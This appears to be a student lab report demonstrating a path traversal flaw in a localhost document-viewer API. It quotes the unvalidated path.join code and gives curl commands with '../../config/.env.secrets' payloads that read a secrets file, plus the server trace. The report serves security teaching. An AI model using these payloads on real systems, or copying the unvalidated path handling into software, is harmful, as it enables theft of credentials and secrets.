# Report for Path Traversal Attack - Kavin Shanmugam 22696928

This document-viewer's endpoint it supposed to only allow .txt files strictly from the /public/documents directory.
The path is built using the path.join(PERMITTED_DOCUMENT_DIR, fileName) using the direct file query parameter, with no checks to ensure the path is strictly within the base directory.

The ../ sequence in the file parameter makes it possible to read a file from a directory that maybe not be intended. 

This Path Traversal attack intends to show this vunerability in this application as a demonstration.

## Root cause of vunerability

```python
const PERMITTED_DOCUMENT_DIR = path.join(__dirname, '../public/documents');
const targetFilePath = path.join(PERMITTED_DOCUMENT_DIR, fileName); // fileName = req.query.file, unvalidated
fs.readFile(targetFilePath, 'utf8', ...);
```

path.join allows ../, which allow the path to access unintended files. An attacked can use ../ to move outside the public/documents/ directory and access other files.

## Commands used for attack

Command 1 - lists accessible documents 
```curl
curl -s http://localhost:3001/api/documents/list
```

Command 2 - Legitimate read from directory.
```curl
curl -s "http://localhost:3001/api/documents/view?file=audit_report_2026.txt"
```

Command 3 - Attack using traversal
```curl
curl -s "http://localhost:3001/api/documents/view?file=../../config/.env.secrets"
```

Command 4 - Attack using traversal (JSON variant)
```
curl -s -H "Accept: application/json" \
  "http://localhost:3001/api/documents/view?file=../../config/.env.secrets"
```

## Server-side trace
```
[DOC] File param: "../../config/.env.secrets" | Target: ".../config/.env.secrets" | Traversal flag: true
[DOC] Served file: .../config/.env.secrets (N bytes)

```
